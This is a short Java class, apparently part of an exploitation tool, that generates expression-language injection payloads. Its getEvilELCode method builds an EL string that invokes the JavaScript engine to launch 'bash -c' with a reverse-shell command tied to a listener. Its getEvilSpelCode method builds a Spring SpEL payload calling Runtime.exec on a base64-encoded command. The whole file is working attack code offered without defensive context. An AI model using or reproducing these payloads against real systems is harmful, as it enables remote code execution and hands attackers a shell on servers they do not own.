package generators;

public class ContextExecGenerator {

    public ExecCodeGenerator execCode;

    public ContextExecGenerator(Listener listener){
        execCode = new ExecCodeGenerator(listener);
    }

    public String getEvilELCode(){

        return String.format(
                "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(" +
                        "\"new java.lang.ProcessBuilder['(java.lang.String[])'](['bash','-c','%s']).start()\"" +
                        ")",
                execCode.reverseShellCommand
        );
    }

    public String getEvilSpelCode(){
        return String.format("T(java.lang.Runtime).getRuntime().exec('%s')", execCode.getBase64CommandTpl());
    }

}
